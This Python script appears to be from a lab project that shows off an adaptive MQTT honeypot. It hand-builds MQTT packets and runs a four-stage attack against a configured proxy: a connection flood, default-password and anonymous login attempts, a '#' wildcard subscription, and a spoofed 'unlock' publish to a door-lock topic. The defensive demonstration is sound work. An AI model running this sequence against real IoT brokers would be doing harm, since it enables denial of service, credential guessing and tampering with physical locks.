#!/usr/bin/env python3
"""Authorized lab traffic that demonstrates adaptive honeypot redirection."""

from __future__ import annotations

import argparse
import socket
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))
from pi.config import integer, load_config


def mqtt_length(size: int) -> bytes:
    encoded = bytearray()
    while True:
        digit = size % 128
        size //= 128
        if size:
            digit |= 0x80
        encoded.append(digit)
        if not size:
            return bytes(encoded)


def field(value: str) -> bytes:
    raw = value.encode()
    return len(raw).to_bytes(2, "big") + raw


def connect_packet(client_id: str, username: str | None = None,
                   password: str | None = None) -> bytes:
    flags = 0x02
    payload = field(client_id)
    if username is not None:
        flags |= 0x80
        payload += field(username)
    if password is not None:
        flags |= 0x40
        payload += field(password)
    body = field("MQTT") + bytes((4, flags, 0, 10)) + payload
    return b"\x10" + mqtt_length(len(body)) + body


def subscribe_packet(topic: str) -> bytes:
    body = b"\x00\x01" + field(topic) + b"\x00"
    return b"\x82" + mqtt_length(len(body)) + body


def publish_packet(topic: str, payload: str) -> bytes:
    body = field(topic) + payload.encode()
    return b"\x30" + mqtt_length(len(body)) + body


def open_socket(host: str, port: int, source_ip: str | None) -> socket.socket:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    if source_ip:
        sock.bind((source_ip, 0))
    sock.connect((host, port))
    return sock


def reconnect(host: str, port: int, source_ip: str | None,
              packet: bytes, attempts: int = 20) -> socket.socket:
    """Keep reconnecting because the proxy deliberately ejects high-risk clients."""
    last_error: OSError | None = None
    for attempt in range(1, attempts + 1):
        try:
            sock = open_socket(host, port, source_ip)
            sock.sendall(packet)
            reply = sock.recv(4)
            if len(reply) >= 4 and reply[0] == 0x20:
                print(f"  reconnect {attempt}: CONNACK={reply[3]}")
                return sock
            sock.close()
        except OSError as exc:
            last_error = exc
        time.sleep(0.2)
    raise RuntimeError(f"could not reconnect after {attempts} attempts: {last_error}")


def main() -> None:
    parser = argparse.ArgumentParser(description="Authorized MQTT honeypot demonstration")
    parser.add_argument("--source-ip", help="bind traffic to this lab source address")
    args = parser.parse_args()
    config = load_config()
    host, port = config["PI_IP"], integer(config, "PROXY_PORT")
    print("=" * 72)
    print("AUTHORIZED TEST NETWORK ONLY - do not run against systems you do not own")
    print("=" * 72)

    print("Stage 1/4: connection-rate flood")
    sockets: list[socket.socket] = []
    for _ in range(integer(config, "CONNECTION_LIMIT") + 1):
        sockets.append(open_socket(host, port, args.source_ip))
    for sock in sockets:
        sock.close()
    time.sleep(0.5)

    print("Stage 2/4: wrong-password and anonymous authentication attempts")
    attempts = [("admin", value) for value in ("admin", "password", "123456", "letmein", "iot")]
    attempts.append((None, None))
    for index, (username, password) in enumerate(attempts):
        sock = reconnect(host, port, args.source_ip,
                         connect_packet(f"auth-{index}", username, password))
        sock.close()
        time.sleep(0.1)

    print("Stage 3/4: reconnect and subscribe to # (now inside the decoy)")
    sock = reconnect(host, port, args.source_ip, connect_packet("recon-stage"))
    sock.sendall(subscribe_packet("#"))
    time.sleep(0.5)
    sock.close()

    print("Stage 4/4: reconnect and publish unlock inside the decoy")
    sock = reconnect(host, port, args.source_ip, connect_packet("spoof-stage"))
    sock.sendall(publish_packet("home/door/lock", "unlock"))
    time.sleep(0.5)
    sock.close()
    print("Attack sequence complete. Inspect the dashboard and decoy log.")


if __name__ == "__main__":
    main()

